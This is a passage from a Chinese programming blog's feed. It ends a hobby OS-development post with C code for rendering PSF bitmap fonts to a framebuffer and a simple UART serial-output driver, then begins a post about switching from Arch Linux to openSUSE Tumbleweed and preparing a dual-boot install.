_binary_font_psf_size<br></code></pre></td></tr></table></figure><p>现在我们来看如何解析这一格式的字体，PSF 有两版规范，由一个 header 来指示字体基本信息， header 之后便是字体的位图信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF1_FONT_MAGIC 0x0436</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf1_header</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> magic;     <span class="hljs-comment">/* magic number for identification */</span><br>    <span class="hljs-type">uint8_t</span> font_mode;  <span class="hljs-comment">/* PSF font mode */</span><br>    <span class="hljs-type">uint8_t</span> char_size;  <span class="hljs-comment">/* PSF char size */</span><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF2_FONT_MAGIC 0x864ab572</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> magic;             <span class="hljs-comment">/* magic number for PSF */</span><br>    <span class="hljs-type">uint32_t</span> version;           <span class="hljs-comment">/* zero */</span><br>    <span class="hljs-type">uint32_t</span> header_size;       <span class="hljs-comment">/* offset of bitmaps in file, 32 */</span><br>    <span class="hljs-type">uint32_t</span> flags;             <span class="hljs-comment">/* 0 if there&#x27;s no unicode table */</span><br>    <span class="hljs-type">uint32_t</span> glyph_nr;          <span class="hljs-comment">/* number of glyphs */</span><br>    <span class="hljs-type">uint32_t</span> bytes_per_glyph;   <span class="hljs-comment">/* size of each glyph */</span><br>    <span class="hljs-type">uint32_t</span> height;            <span class="hljs-comment">/* height in pixels */</span><br>    <span class="hljs-type">uint32_t</span> width;             <span class="hljs-comment">/* width in pixels */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>字体位图有着其固定的宽度与高度，虽然字体的宽度并不一定对齐到 8 bit，但是存储空间需要对齐到 8 bit 也就是 1 字节，因此<strong>位图数据中会有空数据填充段</strong>，以一个 12x12 的 PSF 位图为示例：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">           padding<br> Font data    |<br>+----------+ +--+<br><span class="hljs-number">000001100000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000011110000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000110011000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">001100001100</span> <span class="hljs-number">0000</span><br><span class="hljs-number">011000000110</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>由此我们可以通过如下代码来解析字体文件并在屏幕上显示文字（二代规范）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_font_psf_start[];<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_font_psf_end[];<br><br><span class="hljs-comment">/* char output info */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> fb_cursor_x, fb_cursor_y;    <span class="hljs-comment">/* count by chars */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> max_ch_nr_x, max_ch_nr_y;<br><br><span class="hljs-comment">/* font info */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> *<span class="hljs-title">boot_font</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width, font_height;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width_bytes;<br><span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> *glyph_table;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> bytes_per_glyph, glyph_nr;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_putchar_fb_new_line</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> bg)</span><br>&#123;<br>    fb_cursor_x = <span class="hljs-number">0</span>;<br>    fb_cursor_y++;<br>    <br>    <span class="hljs-comment">/* we may need to scroll up */</span><br>    <span class="hljs-keyword">if</span> (fb_cursor_y &gt;= max_ch_nr_y) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; ((max_ch_nr_y - <span class="hljs-number">1</span>) * font_height); y++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                framebuffer_base[x + y * framebuffer_width] = <br>                framebuffer_base[x + (y + font_height) * framebuffer_width];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; font_height; y++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                <span class="hljs-type">size_t</span> lines = (y + (max_ch_nr_y - <span class="hljs-number">1</span>) * font_height);<br>                <span class="hljs-type">size_t</span> loc = lines * framebuffer_width + x;<br>                framebuffer_base[loc] = bg;<br>            &#125;<br>        &#125;<br><br>        fb_cursor_y--;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_putchar_fb</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> ch, <span class="hljs-type">uint32_t</span> fg, <span class="hljs-type">uint32_t</span> bg)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> *glyph = glyph_table;<br>    <span class="hljs-type">size_t</span> loc;<br><br>    <span class="hljs-comment">/* if char out of range, output null */</span><br>    <span class="hljs-keyword">if</span> (ch &lt; glyph_nr) &#123;<br>        glyph += ch * bytes_per_glyph;<br>    &#125;<br><br>    loc =  fb_cursor_y * font_height * framebuffer_width;<br>    loc += fb_cursor_x * font_width;<br><br>    <span class="hljs-comment">/* output the font to frame buffer */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_y = <span class="hljs-number">0</span>; ch_y &lt; font_height; ch_y++) &#123;<br>        <span class="hljs-type">uint8_t</span> mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_x = <span class="hljs-number">0</span>; ch_x &lt; font_width; ch_x++) &#123;<br>            <span class="hljs-keyword">if</span> ((*(glyph + ch_x / <span class="hljs-number">8</span>) &amp; mask) != <span class="hljs-number">0</span>) &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = fg;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = bg;<br>            &#125;<br><br>            mask &gt;&gt;= <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (ch_x % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br>            &#125;<br>        &#125;<br><br>        glyph += font_width_bytes;<br>    &#125;<br><br>    <span class="hljs-comment">/* move cursor */</span><br>    fb_cursor_x++;<br><br>    <span class="hljs-comment">/* we may need to move to new line */</span><br>    <span class="hljs-keyword">if</span> (fb_cursor_x &gt;= max_ch_nr_x) &#123;<br>        boot_putchar_fb_new_line(bg);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_init_font</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    boot_font = (<span class="hljs-keyword">struct</span> psf2_header*) _binary_font_psf_start;<br><br>    font_width_bytes = (boot_font-&gt;width + <span class="hljs-number">7</span>) / <span class="hljs-number">8</span>;<br>    font_width = font_width_bytes * <span class="hljs-number">8</span>;<br>    font_height = boot_font-&gt;height;<br><br>    glyph_table = (<span class="hljs-type">uint8_t</span>*)_binary_font_psf_start+boot_font-&gt;header_size;<br>    glyph_nr = boot_font-&gt;glyph_nr;<br>    bytes_per_glyph = boot_font-&gt;bytes_per_glyph;<br><br>    fb_cursor_x = fb_cursor_y = <span class="hljs-number">0</span>;<br>    max_ch_nr_x = framebuffer_width / font_width;<br>    max_ch_nr_y = framebuffer_height / font_height;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Extra：-串口输出初探"><a href="#Extra：-串口输出初探" class="headerlink" title="Extra： 串口输出初探"></a><em>Extra： 串口输出初探</em></h3><blockquote><p>注，因为我们目前处在 boot 部分，因此笔者仅会实现一个最简陋的串口输出代码，在后续的 real kernel 部分的代码中我们会重新实现一个更加完备的串口驱动</p></blockquote><p>串口输出是以前老 IBM 机喜欢用的方法，包括 Linux kernel 也支持串口输出功能（当你使用 qemu 运行时若添加了 <code>-nographic</code> 参数 QEMU 会将虚拟机的串口 0 的输出重定向到当前终端，也可以直接在 qemu 的图形界面切换到 <code>serial 0</code>），目前这个输出方式已经很少被使用了， <del>毕竟都什么年代了还在抽传统香烟？</del> 不过在一些特殊场景这个方法还是偶尔会被用到的（例如 headless console），因此这一节我们简单讲讲如何通过串口进行字符输出</p><p><strong>串行通讯端口</strong> （Serial Port，aka COM）通常由 <em>通用异步收发传输器</em> （Universal Asynchronous Receiver&#x2F;Transmitter， UART）进行控制，其内部时钟波特率通常是 115200，目前比较常用的是 <a href="https://gunkies.org/wiki/EIA_RS-232_serial_line_interface">EIA-RS-232</a> 标准，针脚数通常是 25 针或 9 针（后者用的比较多）</p><p><img src="https://s2.loli.net/2024/06/12/jUkhowJWRO67bHg.png" alt="25 针与 9 针"></p><blockquote><p>更多的微机原理知识这里不再赘叙，我们接下来简单讲讲串口如何使用</p></blockquote><p>单个串口的 <em>寄存器组</em> 会被映射到指定的 IO port 起始的区域，我们通过访问串口的不同寄存器进行相应的操作，通常情况下串口映射到端口的<strong>基地址</strong>如下：</p><blockquote><p>需要注意的是 <em>仅有前两个串口的端口地址是固定不变的，其余串口的端口地址未必如下表所示</em>  </p><p>对于守旧的 BIOS 用户，<a href="https://www.cs.yale.edu/flint/feng/cos/resources/BIOS/Resources/biosdata.htm">BIOS Data Area</a> 可以帮助你获取包括 COM 地址在内的各种信息</p><p>对于 <del>不抽传统香烟的</del> 现代 UEFI 用户，</p></blockquote><table><thead><tr><th>COM Port</th><th>IO Port Base</th></tr></thead><tbody><tr><td>COM1</td><td>0x3F8</td></tr><tr><td>COM2</td><td>0x2F8</td></tr><tr><td>COM3</td><td>0x3E8</td></tr><tr><td>COM4</td><td>0x2E8</td></tr><tr><td>COM5</td><td>0x5F8</td></tr><tr><td>COM6</td><td>0x4F8</td></tr><tr><td>COM7</td><td>0x5E8</td></tr><tr><td>COM8</td><td>0x4E8</td></tr></tbody></table><p>不同偏移的寄存器含义如下（来自 <a href="https://wiki.osdev.org/Serial_Ports">OSDEV wiki</a>）：</p><table><thead><tr><th>IO Port Offset</th><th>Setting of DLAB</th><th>I&#x2F;O Access</th><th>Register mapped to this port</th></tr></thead><tbody><tr><td>+0</td><td>0</td><td>Read</td><td>Receive buffer.</td></tr><tr><td>+0</td><td>0</td><td>Write</td><td>Transmit buffer.</td></tr><tr><td>+1</td><td>0</td><td>Read&#x2F;Write</td><td>Interrupt Enable Register.</td></tr><tr><td>+0</td><td>1</td><td>Read&#x2F;Write</td><td>With DLAB set to 1, this is the least significant byte of the divisor value for setting the baud rate.</td></tr><tr><td>+1</td><td>1</td><td>Read&#x2F;Write</td><td>With DLAB set to 1, this is the most significant byte of the divisor value.</td></tr><tr><td>+2</td><td>-</td><td>Read</td><td>Interrupt Identification</td></tr><tr><td>+2</td><td>-</td><td>Write</td><td>FIFO control registers</td></tr><tr><td>+3</td><td>-</td><td>Read&#x2F;Write</td><td>Line Control Register. The most significant bit of this register is the DLAB.</td></tr><tr><td>+4</td><td>-</td><td>Read&#x2F;Write</td><td>Modem Control Register.</td></tr><tr><td>+5</td><td>-</td><td>Read</td><td>Line Status Register.</td></tr><tr><td>+6</td><td>-</td><td>Read</td><td>Modem Status Register.</td></tr><tr><td>+7</td><td>-</td><td>Read&#x2F;Write</td><td>Scratch Register.</td></tr></tbody></table><p>方便起见，在启动阶段我们就不编写太过于复杂的串口驱动了，简单来说，要通过串口进行字符输出，我们首先需要往一部分寄存器中写入特定数据进行串口初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">boot_init_com_internal</span><span class="hljs-params">(<span class="hljs-type">size_t</span> base_port)</span><br>&#123;<br>    <span class="hljs-comment">/* disable all interrupts */</span><br>    outb(base_port + COM_REG_IER, <span class="hljs-number">0x00</span>);<br><br>    <span class="hljs-comment">/* enable DLAB to set bound rate divisor */</span><br>    outb(base_port + COM_REG_LCR, <span class="hljs-number">0x80</span>);<br><br>    <span class="hljs-comment">/* set divisor to 38400 baud */</span><br>    outb(base_port + COM_REG_DLL, <span class="hljs-number">0x03</span>);<br>    outb(base_port + COM_REG_DLM, <span class="hljs-number">0x00</span>);<br><br>    <span class="hljs-comment">/* 8 data bits, parity off, 1 stop bit, DLAB latch off */</span><br>    outb(base_port + COM_REG_LCR, <span class="hljs-number">0x03</span>);<br><br>    <span class="hljs-comment">/* enable FIFO */</span><br>    outb(base_port + COM_REG_FCR, <span class="hljs-number">0xC7</span>);<br>    <br>    <span class="hljs-comment">/* enable IRQs, set RTS/DSR */</span><br>    outb(base_port + COM_REG_MCR, <span class="hljs-number">0x0B</span>);<br><br>    <span class="hljs-comment">/* set in loopback mode and test serial chip */</span><br>    outb(base_port + COM_REG_MCR, <span class="hljs-number">0x1E</span>);<br><br>    <span class="hljs-comment">/* write a byte to test serial chip */</span><br>    outb(base_port + COM_REG_TX, <span class="hljs-string">&quot;arttnba3&quot;</span>[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* check if serial is faulty */</span><br>    <span class="hljs-keyword">if</span> (inb(base_port + COM_REG_RX) != <span class="hljs-string">&quot;arttnba3&quot;</span>[<span class="hljs-number">0</span>]) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* set in normal mode */</span><br>    outb(base_port + COM_REG_MCR, <span class="hljs-number">0x0F</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后直接往串口里 <code>outb()</code> 即可输出字符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_putchar_com</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> ch)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> res;<br><br>    <span class="hljs-comment">/* wait for the port to be ready */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        res = inb(com_base + COM_REG_LSR);<br>        res &amp;= <span class="hljs-number">0x20</span>;<br>    &#125; <span class="hljs-keyword">while</span> (res == <span class="hljs-number">0</span>);<br><br>    outb(com_base, ch);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们为 QEMU 附加 <code>-nographic</code> 的参数进行测试，可以看到串口输出的数据一切正常：</p><blockquote><p><code>Ctrl + A</code> 后再 <code>C</code> 进入 QEMU 调试台，<code>q</code> 退出</p></blockquote><p><img src="https://s2.loli.net/2024/06/13/27ocRUJMamzyQwK.png" alt="真是串串又口口啊"></p><h2 id="真机启动"><a href="#真机启动" class="headerlink" title="真机启动"></a>真机启动</h2><p>接下来我们使用 <code>make</code> 命令编译代码，将 <code>out</code> 目录下的 <code>kernel.bin</code> 文件放到 U 盘 EFI 分区中的 <code>boot</code> 目录下，重启计算机并选择 U 盘启动，接下来——</p><p><strong>ClosureOS，启动——！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041505.png"></p><p>我们成功制作完成了一个<strong>能够在真机上运行的操作系统，而并非大部分教科书上的那些只能在虚拟机里跑的小玩具</strong>，虽然目前仅有最基本的雏形 ：）</p><blockquote><p>我们将在后续博客当中逐步完善这个操作系统（🕊🕊🕊）</p></blockquote><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><p><a href="https://elixir.bootlin.com/linux/latest/source">Linux source code - Bootlin</a></p><p><a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">Multiboot2 Specification version 2.0</a></p><p><a href="https://wiki.osdev.org/Main_Page">OSDev wiki</a> ← 非常好维基，使我OS运行，爱来自瓷器❤</p><p><a href="https://zhuanlan.zhihu.com/UEFIBlog">UEFI 和 BIOS 探秘</a></p><p><a href="https://wiki.osdev.org/PC_Screen_Font">PC Screen Font</a></p><p><a href="https://os.phil-opp.com/">Writing an OS in Rust</a></p><p><a href="https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/">https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/</a></p><p><a href="https://oscarcx.com/tech/usb-boot-winpe-and-linux-via-grub2.html">用grub2制作多重引导的WinPE&amp;Linux启动U盘</a></p><p><a href="https://gunkies.org/wiki/Main_Page">Computer History Wiki</a></p><p><a href="https://wiki.osdev.org/Serial_Ports">Serial Ports</a></p><p><a href="https://www.scs.stanford.edu/09wi-cs140/pintos/specs/pc16550d.pdf">PC16550D Universal Asynchronous Receiver&#x2F;Transmitter with FIFOs</a></p><p><a href="https://www.keil.com/dd/vtr/3880/9788.htm">NXP (founded by Philips) LPC2148 — UARTs: (UART0-1)</a></p><p><a href="https://www.lookrs232.com/rs232/lcr.htm">Line Control Register (LCR)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;遥遥领先！遥遥领先！遥遥领先！&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="https://arttnba3.github.io/categories/CODE/"/>
    
    
    <category term="开发手记" scheme="https://arttnba3.github.io/tags/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Assembly Language" scheme="https://arttnba3.github.io/tags/Assembly-Language/"/>
    
  </entry>
  
  <entry>
    <title>【DISTRO.0x01】如何正确打开 openSUSE Tumbleweed</title>
    <link href="https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/"/>
    <id>https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/</id>
    <published>2023-11-23T14:22:31.000Z</published>
    <updated>2024-07-03T08:25:55.884Z</updated>
    
    <content type="html"><![CDATA[<p>你说🉐对，但是 Arch Linux 是由 Arch 社区开发的一个 Linux 发行版…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者此前一直在用 Arch Linux，但是最近在帮中国大陆的一些 CTF 赛事出题时遇到了一些比较奇怪的问题：在使用 Docker 启动的 Ubuntu 环境中，用来启动题目服务的 <code>xinetd</code> <strong>无法正常工作</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010554.png"></p><p>不过也不是完全连不上，但是要等很久，笔者怀疑可能是内核安全策略的缘故（因为在容器内部用 <code>nc</code> 也连不上），于是笔者测试了市面上比较主流的口碑比较好的几个 Linux 发行版，除了原生 Ubuntu 以外<strong>也就只有 openSUSE 能够正常运行</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010630.png"></p><blockquote><p>当然， <em>有一个发行版是完全连不上，是谁呢</em> ： </p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010725.png"></p></blockquote><p>这样的话笔者完全没有办法在本地测试题目，再加上 Arch Linux 用起来 <em>总是感觉有哪里没有配好的怪异感</em> ，只适合比较闲的时候折腾玩玩，日常使用或许还是一个常规点的发行版会更加安心一些，于是笔者在 Fedora Workstation 短期驻留了一段时间之后选择转向 openSUSE Tumbleweed ，和 Arch 一样是一个滚动发行版，但是 <em>据说德国工艺比较值得令人信赖，SUSE 在企业市场的份额似乎也不小</em> ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124011110.png"></p><blockquote><p>需要注意的是，openSUSE 这个词读音为 <code>/ˌoʊpənˈsuːzə/</code> ，相信不少人和笔者一样一开始会读成 <code>/ˌoʊpənˈsuːz/</code> ，推荐观看<a href="https://www.bilibili.com/video/BV1ab411K7Zs/">这个视频</a>（笑</p></blockquote><p>事实证明，openSUSE Tumbleweed 给笔者一种<strong>又好又烂的感觉</strong>，好就好在德国工艺的 YaST 确实方便易用， <em>仿佛一个和蔼可亲的邻家大蜥蜴一般令人安心</em> ，不好就在于官方自带的中文安装依托答辩，不仅安装界面蹦方块，切换到 Wayland 后自带的 fcitx5 直接罢工（与此同时<strong>先装英文系统再装中文语言包与输入法却能正常使用</strong>）</p><p>但这并非是最要命的点，<strong>用的人少、社区活跃度不足才是最致命的</strong>，openSUSE 早期在中国大陆宣传不足，RHEL 和 Ubuntu 近乎蚕食掉所有的 Linux 市场后才姗姗来迟，<strong>现在在中国大陆能用的镜像站似乎都不剩几个</strong>，<a href="https://forum.suse.org.cn/">中文论坛</a>活跃度还比不上一些快死了的贴吧（<a href="https://forums.opensuse.org/c/english/6">英文论坛</a>的活跃度还可以， <em>不过事实上国内真正称得上活着的 Linux distro-specific forum 除了 Arch 以外好像也没别的了</em> ，这么一看 openSUSE CN 论坛建设其实还可以 ），Wiki 建设度也不太足，这就导致很多问题只能参照其他发行版的类似情况自己再缝缝补补</p><blockquote><p>最直接的后果就是在缺乏指引的情况下，笔者第一次在物理机上尝试 Tumbleweed 时 docker 直接无法正常拉镜像，第二次在物理机上尝试 Tumbleweed 时由于未更新 GRUB 配置导致几次在几次重新启动系统之后<strong>登录界面直接进不去了，只有一个鼠标能动</strong>，切进 tty 以后也一筹莫展（根本找不到使用 openSUSE 出现类似问题的案例与解决方案），在重装了七八次系统后按照第三方社区 ASUS Linux 的配置教程无意中解决了这个问题</p></blockquote><p>但是 <del>抛开事实不谈</del>  <em>抛开这些小毛病不谈，openSUSE 依旧是做得不错的发行版</em> ，Leap 有着超乎想象的稳定性与维护周期，Tumbleweed 在保证了其稳定性的同时依旧能紧追最前沿的技术，虽然国内没啥人用但在国外其实还是有着不错的口碑，因此笔者最终选择尝试在 openSUSE Tumbleweed 上开始自己新的旅程</p><blockquote><p>至于为什么不用 Ubuntu 是因为 Ubuntu Desktop 依托答辩，经常能卡出各种玄学问题，软件包旧且难配，snap 这样不遵守 FHS 而且后端完全受商业公司 Canonical 把控的混沌邪恶的东西更是让人谔谔，只适合放服务器上或是放在虚拟机里玩</p><p>至于为什么不用 Debian 则是因为在笔者感受起来这也是一个更适合在服务器上稳定跑应用的系统，能折腾的空间也不多（<del>年轻人自己用的电脑当然要滚动发行版天天滚，我每天稳定在 Arch 上滚 114 次在 centos stream 上滚 514 次在 tumbleweed 上滚 1919 次并用 Gentoo 自行编译 810 次</del>）， 当然肯定有人要杠说有 Debian Sid 这样的版本，但是在笔者看来未免有点过于不稳定了， <em>当然更重要的是</em> 笔者手上没有<a href="https://github.com/moesoha/debian-media-box">Debian 盒装安装媒介</a> （笑</p></blockquote><h1 id="0x01-安装前的准备工作"><a href="#0x01-安装前的准备工作" class="headerlink" title="0x01. 安装前的准备工作"></a>0x01. 安装前的准备工作</h1><blockquote><p>如果要和笔者一样安装 Windows + Linux 双系统的话<strong>建议先安装 Windows</strong>，因为如果先安装 Linux 的话 Windows 会对 Linux 空间乱动 ：(</p></blockquote><blockquote><p>因为安装的时候没有拍屏所以这里笔者用虚拟机进行截图以示意，<del>毕竟总不能让👴把现在安好的系统再重新安一遍吧，那闲得没事做属于是</del></p></blockquote><p>首先还是在 Windows 上打开 <code>磁盘管理→压缩卷</code> 划出来一块未分配空间，后面我们将在这块空间上安装 openSUSE Tumbleweed：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123234639.png"></p><p>然后在<a href="https://get.opensuse.org/tumbleweed/#download">官网</a>下载镜像，并烧录到 U 盘中（大家应该都和笔者一样使用 U 盘进行安装吧），这里笔者选择使用 <a href="https://etcher.balena.io/#download-etcher">balenaEtcher</a> 进行烧录，直接选择镜像和 U 盘就行：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123235028.png"></p><h1 id="0x02-安装-openSUSE-Tumbleweed"><a href="#0x02-安装-openSUSE-Tumbleweed" class="headerlink" title="0x02. 安装 openSUSE Tumbleweed"></a>0x02. 安装 openSUSE Tumbleweed</h1><p>openSUSE 系统使用 <code>YaST</code> 